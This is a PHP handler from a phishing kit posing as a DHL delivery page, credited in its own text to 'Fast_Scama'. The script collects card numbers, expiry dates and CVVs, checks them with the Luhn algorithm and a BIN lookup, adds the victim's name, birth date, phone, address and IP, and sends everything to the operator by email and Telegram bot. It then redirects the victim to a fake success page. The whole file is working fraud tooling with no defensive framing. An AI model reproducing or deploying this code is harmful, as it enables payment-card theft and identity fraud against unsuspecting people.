<?php
session_start();
include('../settings.php');

$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;

// Récupération de la session
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['ccnum'] = htmlspecialchars($_POST['ccnum']);
$_SESSION['exp'] = htmlspecialchars($_POST['exp']);
$_SESSION['cvv'] = htmlspecialchars($_POST['cvv']);



if (isset($_POST['carte_submit'])) {
	if (empty($_SESSION['ccnum']) || empty($_SESSION['exp']) || empty($_SESSION['cvv'])) {
		header('Location: ../user/carte.php?error=1');
	} else {
		function is_valid_luhn($number)
		{
			settype($number, 'string');
			$sumTable = array(
				array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9),
				array(0, 2, 4, 6, 8, 1, 3, 5, 7, 9)
			);
			$sum = 0;
			$flip = 0;
			for ($i = strlen($number) - 1; $i >= 0; $i--) {
				$sum += $sumTable[$flip++ & 0x1][$number[$i]];
			}
			return $sum % 10 === 0;
		}

		if (is_valid_luhn($_SESSION['ccnum']) && is_numeric($_SESSION['ccnum']) && strlen($_SESSION['ccnum']) >= 16) {
			$cc = $_SESSION['ccnum'];
			$bin = substr($cc, 0, 6);
			$ch = curl_init();
			$url = "https://lookup.binlist.net/$bin";
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			$headers = array();
			$headers[] = 'Accept-Version: 3';
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			$result = curl_exec($ch);
			if (curl_errno($ch)) {
				echo 'Error:' . curl_error($ch);
			}
			curl_close($ch);

			$brand = '';
			$type = '';
			$emoji = '';
			$bank = '';

			$someArray = json_decode($result, true);
			$emoji = $someArray['country']['emoji'];
			$brand = $someArray['brand'];
			$type = $someArray['type'];
			$bank = $someArray['bank']['name'];
			$bank_phone = $someArray['bank']['phone'];
			$subject_title = "[BIN: $bin][$emoji $brand $type]";

			if ($mail_sending == true) {
				$message = "
                [📦] Full Info | DHL MULTI 2023 [⚡]

				[💳]  Numéro : " . $_SESSION['ccnum'] . "
				[📅]  Date d'expiration : " . $_SESSION['exp'] . "
				[🔢]  CVV : " . $_SESSION['cvv'] . "
				[🏛️]  Banque : " . $bank . "
				[🥇]  Niveau : " . $brand . "
				[♻️] Type : " . $type . "

				[👤] Nom  : " . $_SESSION['nom'] . "
				[👤] Prénom : " . $_SESSION['prenom'] . "				
				[📝] Date de naissance  : " . $_SESSION['dob'] . "
				[📞] N° Mobile : " . $_SESSION['tel'] . "
				[📍] Adresse  : " . $_SESSION['adresse'] . "
				[🌍] Ville : " . $_SESSION['ville'] . "
				[🌍] Code Postale : " . $_SESSION['cp'] . "

				[🗺️] INFORMATIONS COMPLÉMENTAIRES [🗺️]
				[⌚] Heure et date du rez : " . $_SESSION["date_heure"] . "
				[🌐] IP : " . $_SESSION['ip'] . "
				[📍] User-agent : " . $_SESSION['useragent'] . "
				[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]
            	";

				$subject = "[💳] CC |" . $_SESSION['ccnum'] . " | " . $_SESSION['exp'] . " | " . $_SESSION['cvv'] . " | " . $_SESSION['ip'];
				$headers = "From: FULL | DHL MULTI 2023 <rez@fastscama.fr>";

				mail($rezmail, $subject, $message, $headers);
			}

			if ($telegram_sending == true) {
				$data = [
					'text' => '
				[📦] Full Info | DHL MULTI 2023 [⚡]

				[💳] Numéro : ' . $_SESSION['ccnum'] . '
				[📅] Expiration : ' . $_SESSION['exp'] . '
				[🔢] CVV : ' . $_SESSION['cvv'] . '
				[🏛️]Banque : ' . $bank . '
				[🥇]Niveau : ' . $brand . '
				[♻️]Type : ' . $type . '

				[👤] Nom et Prénom  : ' . $_SESSION['nom'] . ' ' . $_SESSION['prenom'] . '
				[📝] Date de naissance  : ' . $_SESSION['dob'] . '
				[📞] N°Mobile   : ' . $_SESSION['tel'] . '
				[📍] Adresse  : ' . $_SESSION['adresse'] . '
				[🌍] Ville   : ' . $_SESSION['ville'] . '
				[🌍] Code Postale  : ' . $_SESSION['cp'] . '

				[🗺️] INFORMATIONS COMPLÉMENTAIRES [🗺️]
				[⌚] Heure et date du rez : ' . $_SESSION['date_heure'] . '
				[🌐] Adresse Ip : ' . $_SESSION['ip'] . '
				[📍] User-agent : ' . $_SESSION['useragent'] . '
				[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]

                ',
					'chat_id' => $chat_login
				];

				file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
			}

			if ($vbv_page === true) {
				header("Location: ../user/loader.php");
				exit();
			} else {
				header("Location: ../user/succes.php");
				exit();
			}
		} else {
			header('Location: ../user/carte.php?error=2');
		}
	}

}
?>